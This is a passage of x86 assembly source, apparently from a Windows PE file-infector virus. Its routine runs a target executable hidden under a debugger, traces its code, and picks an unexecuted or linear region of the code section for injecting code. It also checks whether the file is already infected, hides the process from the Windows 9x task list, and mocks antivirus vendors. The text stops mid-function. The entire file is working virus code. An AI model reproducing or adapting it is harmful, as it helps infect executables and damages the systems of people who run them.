locals __
locals @@
__x equ rec;dta
; windows.inc, jmpapi1.inc, jmpapi2.inc, structs.inc
find_uep	proc
; RETURN VALUE: BOOL 1=OK 0=error
; ARGUMENTS
fname	equ ebx+8  	; file name
fljmp		equ ebx+4 ptr 0Ch	; address of jump flag
pjmp	equ ebx+4 ptr 10h	; pointer to variable where jmp offset will be written
				;(0 if no jmp)
codelen 	equ ebx+4 ptr 14h	; size of code we are inserting
inj_addr2	equ	ebx+4 ptr 18h	; pointer to variable where code offset will be written
tt 			equ ebx+4 ptr 1Ch	; pointer to opcode table (lde32)
apitbl		equ ebx+4 ptr 20h	; pointer to wrong API table. Table is the array of API addresses, at the end must be 00000000h (4 bytes)
viroffs		equ ebx+4 ptr 24h	; address of signature to detect during debugging
infflg 		equ ebx+4 ptr 28h	; address of the variable where the infection flag will be written 
__argsize	equ 9
; LOCALS
hmap	equ ebx-4 ptr 8h ; handle of the mapping
codesize	equ ebx-4 ptr 0Ch	; CODE section size
codebase	equ ebx-4 ptr 10h   ; RVA of CODE section
imagebase	equ ebx-4 ptr 14h
imagesize	equ ebx-4 ptr 18h
hf		equ ebx-4 ptr 1Ch
pinfo		equ ebx-4 ptr 30h
sinfo		equ ebx-4 ptr 74h
map	equ ebx-4 ptr 78h	; pointer to the mapping
de	equ ebx-4 ptr 490h ; DEBUG_INFO
cxt equ ebx-4 ptr 600h	; CONTEXT
c_mode	equ ebx-4 ptr 604h
step	equ ebx-4 ptr 608h
stepcount	equ ebx-60Ch
curthread	equ ebx-610h
;hmap		equ ebx-614h
codebuf		equ ebx-4 ptr 614h	; pointer to buffer with CODE 
addr	equ ebx-4 ptr 618h
curthread	equ ebx-4 ptr 61Ch
t2h_id		equ ebx-4 ptr 620h
t2h_count	equ ebx-4 ptr 624h
i3_addr	equ ebx-4 ptr 628h
i3_count	equ ebx-4 ptr 62Ch
entrypoint	equ ebx-4 ptr 630h
t2h_handle	equ ebx-4 ptr 634h
opcode	equ ebx-654h	; buffer for opcodes
predictedeip	equ ebx-4 ptr 658h ; predicted eip
_eip	equ ebx-4 ptr 65Ch	; current eip
dbgbuf	equ ebx-4 ptr 660h	; debug buffer - labels & number of executions
i3_byte	equ ebx-4 ptr 664h
t2h_predeip	equ ebx-4 ptr 668h
oplen	equ ebx-4 ptr 66Ch
index	equ ebx-4 ptr 670h
attempt	equ ebx-4 ptr 674h
__filesize	equ ebx-4 ptr 678h
codephyssize	equ ebx-4 ptr 67Ch
mineip	equ ebx-4 ptr 680h	; minimum eip
dllstep	equ ebx-4 ptr 684h
cnt 	equ	ebx-4 ptr 688h
fn2	equ 	ebx-78Ch
pid	equ	ebx-4 ptr 790h
ldte equ ebx-7A0h
hevent equ ebx-4 ptr 7B0h
accbuf equ ebx-4 ptr 7B4h	; debug buffer - accesses to memory in CODE section
hdfile	equ ebx-4 ptr 7B8h

__localssize	equ 900h
THRNUM	equ 100h
I3NUM	equ 8192

	push ebx
	mov ebx, esp
	sub esp, __localssize
	pushad
	; wipe locals
	lea edi, [pid];[ebx-(__localssize)]; [mineip]
	sub eax, eax
	mov ecx, 790h-0Ch; __localssize	;680h-8
	rep stosb

	; open file
	mov edi, [fname]
	mov eax, [infflg]
	mov 4 ptr [eax], 0

	sub eax, eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	push	edi
	xcall CreateFileA
	cmp eax, -1
	jz __findfail3
	mov [hf], eax
	sub ecx, ecx
	push ecx	; 0
	push ecx
	push ecx
	push PAGE_READONLY	 ;PAGE_READWRITE
	push ecx
	push eax
	xcall CreateFileMappingA
	mov [hmap], eax

	; create file mapping
	sub ecx, ecx
	push ecx	; 0
	push ecx
	push ecx
	push FILE_MAP_READ	 ;FILE_MAP_ALL_ACCESS
	push eax
	xcall MapViewOfFile
	or eax, eax
	jz __findfail
	mov [map], eax

	push 0
	push [hf]
	xcall GetFileSize
	mov [__filesize], eax

	mov edx, [map] 	; edx -> file buffer

	cmp 2 ptr [edx], 'ZM'
	jnz __findfail
	mov eax, edx
	mov edi, [edx].mz_neptr
	cmp edi, [__filesize]	; PE format check
	jnl __findfail
	add eax, edi
	cmp 2 ptr [eax], 'EP'
	jnz __findfail
	; get imagebase, imagesize
	mov ecx, [eax].pe_imagebase
	mov [imagebase], ecx
	mov ecx, [eax].pe_imagesize
	mov [imagesize], ecx
	mov edi, eax ; edi->PE header
	; get CODE section address
	mov edx, [edi].pe_entrypointrva
	mov [entrypoint], edx
	movzx ecx, [edi].pe_numofobjects
	mov [oplen], edi	; save address of PE
	add edi, pe_size ; edi -> section table
__secsearchloop:
	mov esi, edx
	sub esi, [edi].oe_virt_rva
	jl __1
	sub esi, [edi].oe_virt_size
	jnl __1
	jmp __secfound
__1:
	add edi, oe_size
	loop __secsearchloop
	; CODE section not found - we'll never get here
	jmp __findfail
__secfound:
	; CODE section found
	; allocate memory for buffers
	mov eax, [edi].oe_virt_rva
	mov [codebase], eax
	mov eax, [edi].oe_phys_size
	mov [codephyssize], eax
	mov eax, [edi].oe_virt_size
	mov [codesize], eax
	call _valloc
	mov [dbgbuf], eax
	jz __findfail

	mov eax, [codesize]
	call _valloc
	mov [accbuf], eax
	jz __findfail

	mov eax, [codesize]
	call _valloc
	mov [codebuf], eax
	jz __findfail

	; copy CODE section to codebuf
	mov esi, [edi].oe_phys_offs
	cmp esi, [__filesize]
	jge __findfail
	add esi, [map]
	push edi
	mov edi, eax
	mov ecx, [codephyssize]
	cmp ecx, [codesize]
	jl __movsb
	mov ecx, [codesize]		; size - least of CODE's physical and virtual sizes
__movsb:
	rep movsb
	pop edi

	; mark import entries in CODE section
	call _markimports

	; close file
	push [map]
	xcall UnmapViewOfFile
	push [hmap]
	xcall CloseHandle
	push [hf]
	xcall CloseHandle

	; allocate memory
	mov eax, THRNUM*4
	call _valloc
	mov [t2h_id], eax
	jz __findfail2
	mov eax, THRNUM*4
	call _valloc
	mov [t2h_handle], eax
	jz __findfail2
	mov eax, THRNUM*4
	call _valloc
	mov [t2h_predeip], eax
	jz __findfail2
	mov eax, 4*I3NUM
	call _valloc
	mov [i3_addr], eax
	jz __findfail2
	mov eax, I3NUM
	call _valloc
	mov [i3_byte], eax
	jz __findfail2
; algorithm:
; - run 4096 steps and look for command with size not smaller than 5 (for jmp)
; - mark number of executions and labels in dbgbuf
; - after end of debugging look for appropriate place

dllstepcount	equ 0EFFFh	; max number of steps inside dll

	; set count of steps. 
;	rdtsc
;	and eax, 3FFFh	; макс. число шагов вне ядра
;	add eax, 1000h
	mov eax, 1000h	; to avoid re-infection we will set fixed count of steps

	mov [stepcount], eax
	sub eax, eax
	; current step #
	mov [step], eax
	; address of jmp
	mov [addr], eax
	; counters
	mov [t2h_count], eax
	mov [i3_count], eax

	; run
	;sub eax, eax
	lea edi, [cxt]
	mov ecx, size context
	rep stosb
	mov [cxt].c_contextflags, CONTEXT_SEGMENTS+CONTEXT_INTEGER+CONTEXT_CONTROL;;DEFAULT_CONTEXTFLAGS
	lea edi, [sinfo]
	mov ecx, size startupinfo
	rep stosb
	mov [sinfo].si_size, size startupinfo
	mov [sinfo].si_flags, STARTF_USESHOWWINDOW
	mov [sinfo].si_show, SW_HIDE	; disable windows appearance

;nop
;int 3
	lea eax, [pinfo]
	push eax
	lea eax, [sinfo]
	push eax
	push 0 0
	push    DEBUG_ONLY_THIS_PROCESS+DEBUG_PROCESS ; flags
	push	0 0 0
	mov eax, [fname]
	push eax
	push 0
	xcall CreateProcessA
	or eax, eax
	jz __findfail2

IF DEBUG EQ 1
	call __347
	db 13, 10, 0
__347:
	call _cout
	mov eax, [fname]
	push eax
	call _cout

	pushad
	lea eax, [ebp+_msvcrt-__x]
	push eax
	xcall LoadLibraryA	
	popad

ENDIF

IF NORELEASE EQ 1
	push 50 1000
	xcall Beep
ENDIF

IF RELEASE EQ 1
;	int 3
ENDIF

	; hide process in tasklist for win9x
	mov ax, ds
	cmp ax, 137h
	jb __76788
	push 1
	push [pinfo].pinfo_pid
	xcall RegisterServiceProcess
__76788:
	
	mov eax, [pinfo].pinfo_thandle
	mov [curthread], eax	

	; create event 
	sub eax, eax
	push eax eax 1 eax
	xcall CreateEventA
	mov [hevent], eax
	or eax, eax
	jz __findfail2

	mov eax, [pinfo].pinfo_pid
	mov [pid], eax

	; the main idea of this debugger is z0mbie's
	; but it was redesigned

__cycle1:
	push 5000
	lea edx, [de]
	push edx
	xcall WaitForDebugEvent
	or eax, eax
	jz __got_addr2 	; exit if hang
	inc [cnt]	; counter for limitation of step count for case of infinite looping
	cmp [cnt], maxcnt
	jg __got_addr
maxcnt	equ 5500h	; maxcnt>stepcount  ( maxcnt>dllstepcount)

IF DEBUG EQ 1
	call __3456
	db 13, 10, 0
__3456:
	call _cout	; carriage return
	push [de].de_code
	call __565
	db "code=%d::",0
__565:

	lea eax, [ebp+__cn-__x]
	push eax
	xcall sprintf
	add esp, 3*4
	call __786
__cn	db 40 dup (0)
__786:
	call _cout
ENDIF

	lea edx, [de]

	push edx
	; check if hook was executed
	push 0
	push [hevent]
	xcall WaitForSingleObject
	pop edx
	or eax, eax
	jnz __4534
	; hook's been executed
	; but in practice this event wus not set 
IF DEBUG EQ 1
	call __3447
	db 13, 10, "hook event", 0
__3447:
	call _cout	; CR
ENDIF
	jmp __got_addr2	; if there were user32 messages (windows creation), get out
__4534:

	; c_mode - debug mode
	mov [c_mode], DBG_EXCEPTION_NOT_HANDLED
	cmp [edx].de_code, CREATE_PROCESS_DEBUG_EVENT
	jnz     __skip0
	; process creation - add thread, set break at entrypoint
	mov eax, [edx].de_tid              ; id
	mov edi, [edx].de_data.dword ptr 8 ; handle
	mov [curthread], edi
	mov     esi, [edx].de_data.dword ptr 1Ch  ; eip
	mov [predictedeip], esi	; predicted eip = address of breakpoint
	mov [mineip], esi
	call _t2h_add

	mov eax, [edx].de_data.dword ptr 0h  ; hfile
	mov [hdfile], eax

	mov     eax, [edx].de_data.dword ptr 0Ch  ; imagebase
	cmp eax, [imagebase]
	jnz __findfail2

	mov [_eip], esi
	mov [addr], esi
	call _insert_int3

__skip0:
	cmp     [edx].de_code, CREATE_THREAD_DEBUG_EVENT
	jnz     __skip1
	; thread creation - add thread, set break at start of the thread

	mov     eax, [edx].de_tid               ; id
	mov     edi, [edx].de_data.dword ptr 0  ; handle
	mov     esi, [edx].de_data.dword ptr 8    ; eip
	mov [predictedeip], esi
	call    _t2h_add

	call    _insert_int3

__skip1:
	cmp     [edx].de_code, EXIT_THREAD_DEBUG_EVENT
	jnz     __skip4
	; delete the thread from the table
	mov     eax, [edx].de_tid
	call    _t2h_del

__skip4:
	cmp     [edx].de_code, EXCEPTION_DEBUG_EVENT
	jnz     __skip2

	mov [c_mode], DBG_CONTINUE
	mov     eax, [edx].de_tid
	call    _t2h_convert
	mov     [curthread], eax
	mov [index], edi
	mov     esi, [edx].de_data.dword ptr 12	; eip
	mov [_eip], esi

IF DEBUG EQ 1
	pushad
	push esi
	call __563
	db " addr=%08X::",0
__563:
	lea eax, [ebp+__cp-__x]
	push eax
	xcall sprintf
	add esp, 3*4
	call __324
__cp	db 40 dup (0)
__324:
	call _cout
;	add esp, 4
	popad
ENDIF

	; int1 & int3 exceptions handling
	cmp     [edx].de_data.dword ptr 0, EXCEPTION_SINGLE_STEP
	jz      __my_except1
	cmp     [edx].de_data.dword ptr 0, EXCEPTION_BREAKPOINT
	jz      __my_except3
	jmp 	__skip2
	
	; other exceptions
;	call _get_context
;	call _set_context
;	lea eax, [ldte]	
;	push eax
;	push [cxt].c_fs
;	push [curthread]
;	xcall GetThreadSelectorEntry

;	mov ch, [ldte].byte ptr 7
;	mov cl, [ldte].byte ptr 4
;	shl ecx, 16
;	mov cx, [ldte].word ptr 2

;	mov esi, ecx
;	add esi, 4
;	call _get_opcode

;	mov [c_mode], DBG_EXCEPTION_NOT_HANDLED
;	; set int3 to seh
;	mov esi, 4 ptr [opcode]   ; seh handler addr
;	mov eax, esi
;	call _in_range
;	or eax, eax
;	jz __continue
;	call _insert_int3
	; no prediction
	jmp __continue


__my_except1:

IF DEBUG EQ 1
	call __3443
	db "int1", 0
__3443:
	call _cout	; CR
ENDIF

	mov eax, esi
	call _in_range
	or eax, eax
	jz __in_kernel
	; we are at CODE section
	mov [dllstep], 0	; reset dll step counter

	call _set_mineip
	call _set_tf
	call _get_opcode

	; infection check
	call _cmp_code
	jnz __765

	; file is already infected
	mov eax, [infflg]
	mov 4 ptr [eax], 1
	jmp __got_addr2
__765:

	; disassembling using lde32 (z0mbie)
	lea eax, [opcode]
	push eax
	push [tt]
	call disasm_main
	add esp, 8
	or eax, eax
	jz __got_addr2	; stop if couldn't disasm
	mov [oplen], eax
	call _set_label

	; if ret, set prediction at return address
	mov eax, 4 ptr [opcode]
	cmp al, 0C3h
	jz __setretaddr
	cmp al, 0CBh
	jz __setretaddr
	cmp al, 0C2h
	jz __setretaddr
	cmp al, 0CAh
	jz __setretaddr
	jmp __normal1

__setretaddr:
	push    esi
   	mov     esi, [cxt].c_esp
	call    _get_opcode
   	pop     esi
	mov     eax, 4 ptr [opcode]  ; stack: return address
	call _set_pred
	jmp __inc_step

__normal1:	; не ret 
	mov eax, [oplen]
	add eax, esi ; eax = predicted address = next command
	call _set_pred

	call _skipstr	; skip string operations

__inc_step:
	inc [step]
	mov eax, [step]
	cmp eax, [stepcount]
	jg __got_addr2

__exc1cont:
	jmp __continue


__in_kernel:	
	; we are in dll (kernel32, user32, ...)
	; check for bad winapi
	call _is_bad_winapi
	or eax, eax
	jnz __got_addr2
	call _clear_tf

;	call _set_tf	; dll debuggind 
;	call    _get_opcode
;	call _skipstr	; skip string operations



	push    esi
 	mov     esi, [cxt].c_esp
	call    _get_opcode
   	pop     esi

	mov     eax, 4 ptr [opcode]  ; stack: return addr
	call    _in_range
	or eax, eax
	jz     __exc1cont

	; we are in dll and return address points in CODE
	push    esi
   	mov     esi, dword ptr [opcode]  ; stack: return addr
	call    _insert_int3
	pop     esi
	
;	inc [dllstep]
;	cmp [dllstep], dllstepcount
;	jg __got_addr2

   	jmp     __exc1cont

__my_except3:

IF DEBUG EQ 1
	call __3444
	db "int3", 0
__3444:
	call _cout	; CR
ENDIF

	mov     esi, [edx].de_data.dword ptr 12
	mov eax, esi
	call _in_range
	or eax, eax
	jz	__krnl_i3

	; set hook if we are at entrypoint
;int 3	
;	jmp __675
	mov eax, esi
	sub eax, [imagebase]
	sub eax, [entrypoint]
	jnz __675
	; load psapi for nt
	pushad
	lea eax, [ebp+_psapi-__x]
	push eax
	xcall LoadLibraryA	
	or eax, eax
	popad
	
	push [hevent]
	push [edx].de_tid
	push 0
	push [pinfo].pinfo_pid
	call sethook
__675:

	call _set_mineip
	; убираем int3
	call _delete_int3

	call _get_opcode
	; disassembling
	lea eax, [opcode]
	push eax
	push [tt]
	call disasm_main
	add esp, 8
	or eax, eax
	jz __got_addr2	; stop if couldn't disasm
	mov [oplen], eax
	call _set_label
	mov eax, [oplen]
	add eax, esi ; eax = predicted address
	call _set_pred
	inc [step]
	mov eax, [step]
	cmp eax, [stepcount]
	jg __got_addr2
	call    _set_tf_dec_eip


__krnl_i3:
;	call _set_tf	; dll debugging
	jmp     __continue


__skip2:
	cmp     [edx].de_code, EXIT_PROCESS_DEBUG_EVENT
	jz      __exit_proc
	cmp     [edx].de_code, RIP_EVENT
	jz      __exit_proc
	cmp     [edx].de_code, EXCEPTION_DEBUG_EVENT
	jz      __got_addr2
	jmp __continue

__exit_proc:
	mov eax, [edx].de_pid
	cmp eax, [pid]
	jnz __continue	; don't stop debugging if not our process's been stopped
	jmp __got_addr

__got_addr2:

	; kill process
	call _get_context
	apiaddr ExitProcess, __x
	mov [cxt].c_eip, eax				; set eip = ExitProcess
	sub [cxt].c_esp, 8
	and [cxt].c_eflags, 0FEFFh   ; clear TF
	call _set_context

__continue:
	push    [c_mode]
	push    [de].de_tid
	push    [de].de_pid
	xcall   ContinueDebugEvent
	jmp __cycle1

__got_addr:
	; address of jmp is found
	; bury the process
	push DBG_EXCEPTION_NOT_HANDLED
	push    [de].de_tid
	push    [de].de_pid
	xcall   ContinueDebugEvent
	mov esi, [pinfo].pinfo_phandle
	push -1
	push esi
	xcall TerminateProcess
	; check process termination
__waitfor:
	push 5000
	push esi
	xcall WaitForSingleObject
	or eax, eax
	jnz __findfail2
	
__nodel:	
	push [hdfile]
	xcall CloseHandle
	push [pinfo].pinfo_thandle
	xcall CloseHandle
	push [pinfo].pinfo_phandle
	xcall CloseHandle
	; free memory
	mov eax, [t2h_id]
	call _vfree
	mov eax, [t2h_handle]
	call _vfree
	mov eax, [t2h_predeip]
	call _vfree
	mov eax, [i3_addr]
	call _vfree
	mov eax, [i3_count]
	call _vfree
	mov eax, [i3_byte]
	call _vfree

	mov eax, [codesize]
	sub eax, [codelen]
	jl __findfail2
	mov [_eip], eax
	; adjust mineip to codebase

	; leave if already infected
	mov eax, [infflg]
	cmp 4 ptr [eax], 0
	jnz __findfail2

	mov eax, [mineip]
	sub eax, [codebase]
	sub eax, [imagebase]
	mov [mineip], eax

	; search for part of code with length not less than codelen without 
	; labels and non-zero execution count

	rdtsc
	and eax, 07h
	add eax, 4
	mov [oplen], eax	; attempts count in oplen
	sub eax, eax
	mov [attempt], eax
	mov [index], eax
	mov edx, [dbgbuf]
	mov eax, [mineip]	; index in dbgbuf array. must not be greater
					; than codesize-codelen
__cycle3:
	cmp eax, [_eip]
	jnl __found_line1
	mov ecx, [codelen]
	lea esi, 4 ptr [edx+eax]
	mov 1 ptr [opcode], 0
	mov 4 ptr [opcode+10], 0
__lookfor1:
	push eax
	mov al, 1 ptr [esi]
	or 1 ptr [opcode], al
	mov ah, al	;	executions count
	and ah, 7Fh
	movzx edi, ah
	add 4 ptr [opcode+10], edi	; sum to determine if code has same 
							; executions count
	pop eax
	inc esi
	loop __lookfor1
	and 1 ptr [opcode], 80h
	jnz __labels_suxx
	; found part of code without labels
	mov cl, 1 ptr [edx+eax]
	and cl, 7Fh
	or cl, cl
	jz __labels_suxx
	push edx eax
	sub edx, edx
	mov eax, 4 ptr [opcode+10]
	div 4 ptr [codelen]
	or edx, edx	;  if remainder is not zero the code part is linear
	pop eax edx
	jnz __labels_suxx

	mov [index], eax		; remember offset
	inc [attempt]
	mov edi, [oplen]
	cmp edi, [attempt]
	jle __found_line1
	; next appempt
	; forwars to next label
__forward:
	inc eax
	cmp eax, [_eip]
	jg __found_line1	; end if no more labels
	test 1 ptr [edx+eax], 80h
	jz __forward
	dec eax
__labels_suxx:	
	inc eax
	jmp __cycle3

__found_line1:
	; clear jump flag
	mov ecx,  [fljmp]
	mov 4 ptr [ecx], 0
   	; restore offset in eax
	mov eax, [index]
	or eax, eax
	jz __second_attempt
__nojump:
	mov ecx, [inj_addr2]
	mov [ecx], eax
	mov ecx, [pjmp]
	mov 4 ptr [ecx], 0
	jmp __findok

__second_attempt:
	; look for never executed part of code with nesessary length
	mov esi, [_eip]
	sub esi, [mineip]
	jl __findfail2
	push edx
__calc_attempts:
	rdtsc
	and eax, 07fffh
	mov ecx, eax
	mov edx, [codelen]
	mul edx
	cmp eax, esi
	jge __calc_attempts	
	pop edx
	mov [oplen], ecx	; attempts count in oplen (CHANGED (,eax) -> (,ecx)
	sub eax, eax
	mov [attempt], eax	; current attempt number
	mov [index], eax	; result is here
	mov edx, [dbgbuf]
	mov eax, [mineip]	; index in dbgbuf array. must not be greater
					; than codesize-codelen
__cycle10:
	cmp eax, [_eip]
	jnl __found_line3
	mov ecx, [codelen]
	lea esi, [edx+eax]
	mov edi, [accbuf]
	add edi, eax
	mov 1 ptr [opcode], 0	; accumulator for execution count
__lookfor3:
	push eax
	mov al, 1 ptr [esi]
	or 1 ptr [opcode], al
	mov al, 1 ptr [edi]
	or 1 ptr [opcode], al
	pop eax
	inc esi
	inc edi
	loop __lookfor3
	cmp 1 ptr [opcode], 0
	jnz __labels_suxx3

	; found never executed part of code
comment #
	; check for repeating bytes 
	pushad 
	mov edi, [codebuf]
	add edi, eax
	push 4
	pop eax
;	jle __noth
__fcycle1:
	mov ecx, 5
	mov dl, 1 ptr [edi+ecx*4]
__fcycle2:
	cmp dl, [edi+ecx*4]
	jnz __diff
	loop __fcycle2		

	; if there are repeating bytes - refuse position
	popad 	
	jmp __labels_suxx3

__diff:	
	inc edi	; increase pointer
	dec eax
	jnz __fcycle1

__noth:	;no repeating bytes found
	popad
#

	mov [index], eax		; remember offset
	inc [attempt]
	mov edi, [oplen]
	cmp edi, [attempt]
	jle __found_line3
	; next appempt
__labels_suxx3:
	add eax, [codelen]
	jmp __cycle10
__not_found3:

__found_line3:
	; set jump flag
	mov ecx,  [fljmp]
	mov 4 ptr [ecx], 1
   	; restore offset in eax
	mov eax, [index]
	or eax, eax
	jz __findfail2
	mov ecx, [inj_addr2]
	mov [ecx], eax
	mov eax, [addr]
	or eax, eax
	jz __findfail2
	cmp eax, [entrypoint]
	jz __findfail2
	sub eax, [codebase]
	sub eax, [imagebase]
	mov ecx, [pjmp]
	mov 4 ptr [ecx], eax
	jmp __findok

	

__findfail:
	mov eax, [dbgbuf]
	call _vfree
	mov eax, [codebuf]
	call _vfree
	push [map]
	xcall UnmapViewOfFile
	push [hmap]
	xcall CloseHandle
	push [hf]
	xcall CloseHandle
	popad
	sub eax, eax
	jmp __findret

__findfail2:
	mov eax, [i3_addr]
	call _vfree
	mov eax, [t2h_id]
	call _vfree
	mov eax, [i3_count]
	call _vfree
	mov eax, [t2h_handle]
	call _vfree
	mov eax, [t2h_predeip]
	call _vfree
	mov eax, [i3_byte]
	call _vfree
	mov eax, [dbgbuf]
	call _vfree
	mov eax, [codebuf]
	call _vfree
	push [hevent]
	xcall CloseHandle
__findfail3:
	popad
	sub eax, eax
	jmp __findret

__findok:
	mov eax, [dbgbuf]
	call _vfree
	mov eax, [codebuf]
	call _vfree
	push [hevent]
	xcall CloseHandle
	popad
	sub eax, eax
	inc eax

__findret:
	add esp, __localssize
	mov esp, ebx
	pop ebx
	ret __argsize*4

find_uep	endp
;--------------------------------------------------------------
_is_bad_winapi:
; returns 1 if esi -> bad api
; esi = tested address
	pushad
	cmp [apitbl], 0
	jz __nobad
	mov eax, [apitbl]
__cycle4:
	cmp 4 ptr [eax], 0
	jz __nobad
	cmp [eax], esi
	jz __bad
	add eax, 4
	jmp __cycle4
__nobad:
	popad
	sub eax, eax
	retn
__bad:
	popad
	sub eax, eax
	inc eax
	retn

;--------------------------------------------------------------
_get_context:
	pushad
	push    [curthread]
	xcall   SuspendThread
	lea eax, [cxt]
	push    eax
    push    [curthread]
    xcall   GetThreadContext
	popad
    retn

;--------------------------------------------------------------
_set_context:
	pushad
	lea eax, [cxt]
	push    eax
    push    [curthread]
    xcall   SetThreadContext
	push    [curthread]
	xcall   ResumeThread
	popad
	retn

;--------------------------------------------------------------
_set_tf:
	pushad
	call    _get_context
	lea eax, [cxt]
	or      [eax].c_eflags, 0100h   ; TF
	call    _set_context
	popad
    retn

;--------------------------------------------------------------
_set_tf_dec_eip:
	pushad
	call    _get_context
	lea eax, [cxt]
	or      [eax].c_eflags, 0100h   ; TF
	dec [eax].c_eip
	call    _set_context
	popad
    retn

;--------------------------------------------------------------
_clear_tf:
	pushad
	call    _get_context
	lea eax, [cxt]
	and      [eax].c_eflags, 0FEFFh   ; TF
	call    _set_context
	popad
	retn

;--------------------------------------------------------------
_in_range:
; in: eax=address
; out: eax=1/0
; check if eax is in CODE section
	sub eax, [imagebase]
	jl __i1
	sub eax, [codebase]
	jl __i1
	cmp eax, [codesize]
	jge __i1
	sub eax, eax
	inc eax
	retn
__i1: ; below/behigh
	sub eax, eax
	retn

;--------------------------------------------------------------
_get_opcode:
	; esi = address of command
	pushad
	push    0
	push    32	; opcodes array - 32 bytes
	lea eax, [opcode]
	push eax
	push    esi
	lea eax, [pinfo]
	push [eax].pinfo_phandle
	xcall ReadProcessMemory
	or eax, eax
	popad
	retn

;--------------------------------------------------------------
_set_opcode:
	; esi = address of command
	pushad
	push    0
	push    32	; opcodes array - 32 bytes
	lea eax, [opcode]
	push eax
	push    esi
	lea eax, [pinfo]
	push [eax].pinfo_phandle
	xcall WriteProcessMemory
	popad
	retn

;--------------------------------------------------------------
_set_pred:
; set prediction for current thread
; eax = prediction address
	pushad
	mov edx, [t2h_predeip]
	mov ecx, [index]	; index of current thread
	mov [edx][ecx*4], eax
	popad
	retn

;--------------------------------------------------------------
_set_label:
; set label
; esi = VA of label
; [oplen] - длина операции
	pushad
	sub eax, eax
	mov edx, [t2h_predeip]
	mov ecx, [index]
	cmp [edx][ecx*4], esi
	jz __435
	mov ah, 80h
__435:
	mov ecx, [oplen]
	cmp ecx, 5
	jl __437
	mov [addr], esi
__437:
	sub esi, [codebase]
	sub esi, [imagebase]
	add esi, [dbgbuf]
	sub edi, edi
__cycle5:
	cmp 1 ptr [esi+edi], 7Fh
	jz __436
	inc 1 ptr [esi+edi] ; executions count - 0...127
__436:
	or 1 ptr [esi+edi], ah ; major bit - label 
	inc edi
	loop __cycle5
	popad
	retn

;--------------------------------------------------------------
_insert_int3:
; esi = address to set int3
	pushad
	call _get_opcode
	mov     al, 0CCh
	xchg    al, 1 ptr [opcode]
	cmp     al, 0CCh
    jz      __ii3_ret
	push edx	
	mov     ecx, [i3_count]
	mov edx, [i3_addr]
	mov     [edx][ecx*4], esi
	mov edx, [i3_byte]
	mov     [edx][ecx], al
	inc     [i3_count]
	mov eax, [i3_count]
	and eax, I3NUM-1
	mov [i3_count], eax
	pop edx
	call _set_opcode
__ii3_ret:
	popad
	retn

;--------------------------------------------------------------
_delete_int3:
; input:  esi = INT3 address	
	pushad
	cmp [i3_count], 0
	jz __di3_ret
	call    _get_opcode

	cmp 1 ptr [opcode], 0CCh
	jnz __di3_ret

	mov     ecx, I3NUM
	mov     edi, [i3_addr]
	mov     eax, esi
	repnz   scasd
	jnz     __di3_ret

	sub     ecx, I3NUM-1
	neg     ecx

	sub eax, eax
	mov edx, [i3_addr]
	mov [edx][ecx*4], eax
	mov edx, [i3_byte]
	xchg al, [edx][ecx]

	mov 1 ptr [opcode], al
	call _set_opcode
	dec [i3_count]
__di3_ret:
	popad
	retn

;--------------------------------------------------------------
_t2h_add:
; input: EAX=id
;        EDI=handle
	pushad
	sub ecx, ecx
	mov edx, [t2h_id]

__cycle6:
	cmp 4 ptr [edx][ecx*4], 0
	je __found1
	inc ecx
	cmp ecx, THRNUM
   	jnz __cycle6
	popad
	retn
__found1:
	mov     [edx][ecx*4], eax
	mov edx, [t2h_handle]
	mov     [edx][ecx*4], edi
	mov edx, [t2h_predeip]
	mov eax, [predictedeip]
	mov [edx][ecx*4], eax
	popad
	retn

;--------------------------------------------------------------
_t2h_del:
; input: EAX=id
	pushad
	sub ecx, ecx
	mov edx, [t2h_id]
__cycle7:
	cmp [edx][ecx*4], eax
	jz __found2
   	inc ecx
	cmp ecx, THRNUM
   	jnz __cycle7
   	popad
   	retn
__found2:
	sub eax, eax
   	mov [edx][ecx*4], eax
	mov edx, [t2h_handle]
   	mov [edx][ecx*4], eax
	mov edx, [t2h_predeip]
   	mov [edx][ecx*4], eax
	popad
   	retn

;--------------------------------------------------------------
_t2h_convert:
; input: EAX=id
; output:EAX=handle
;        EDI=index
	push edx ecx
	sub ecx, ecx
   	mov edx, [t2h_id]
__cycle8:
   	cmp     [edx][ecx*4], eax
   	jz __found3
   	inc ecx
	cmp ecx, THRNUM
   	jnz __cycle8
   	sub eax, eax
__exit:
   	mov edi, ecx
	pop ecx edx
	retn
__found3:
	mov edx, [t2h_handle]
	mov eax, [edx][ecx*4]
   	jmp __exit

;--------------------------------------------------------------

_set_mineip:
	cmp esi, [mineip]
	jge @@69
	mov [mineip], esi
@@69:
	retn

_skipstr:
	; skip string operations
	mov eax, 4 ptr [opcode]
   	and     ax, 0FEFEh  ; f2/f3
   	cmp     al, 0F2h    ; repe/ne
   	jnz     __skip8
   	cmp     ah, 0A4h    ; movs
   	jz      __skipit
   	cmp     ah, 0A6h    ; cmps
   	je      __skipit
   	cmp     ah, 0AAh    ; stos
   	je      __skipit
   	cmp     ah, 0AEh    ; scas
   	je      __skipit
   	jmp     __skip8
__skipit:
   	push    esi
   	add     esi, 2
   	call    _insert_int3
	;mov eax, esi	
	;call 	_set_pred
	; no need to set prediction: this is not jump command
   	call    _clear_tf
   	pop     esi
__skip8:
	retn

_cmp_code:
	; check for infection 
	; for infected file code at [edi-14h] coincides with signature of virus 
	; at some time
	; 2avers: u r lame
	pushad 

comment !
	call _get_context
	call _set_context
	mov esi, [cxt].c_edi
	sub esi, 14h
	call _get_opcode
	jz __ccfail
	mov esi, [viroffs]
	lea edi, [opcode]
;	mov ecx, 10h
;	rep cmpsb
	cmpsd
!
	; если eip указывает на DB 04 24 (fild 4 ptr [esp]), файл заражен
	lea eax, [opcode]
	cmp 2 ptr [eax], 04DBh
	jnz __ccfail
	cmp 1 ptr [eax+2], 24h
	jnz __ccfail
	sub eax, eax
	popad
	ret
__ccfail:
	sub eax, eax
	cmp eax, 1
	popad
	ret

_markimports:
	pushad
	mov edi, [oplen]	; edi -> pe header
	mov eax, [edi].pe_importtablerva	; edx=RVA of imports

	; check if eax -> into CODE section
	call _intocode
	jz __674

	call _marktozero4

	
	mov eax, [edi].pe_importtablerva	; edx=RVA of imports
	call _rva_to_phys
	mov esi, [map]
	add esi, eax	; esi -> import table in mapped file

	; scanning all DLL entries
__mark_dllentries:
	; 1.lookup table
	mov eax, [esi].im_lookuptablerva
	call _intocode
	jz __6784
	; lookuptable is inside of CODE section

	; mark all pointers to names
	call _marktozero4
	
	; eax = lookup table RVA
	call _rva_to_phys
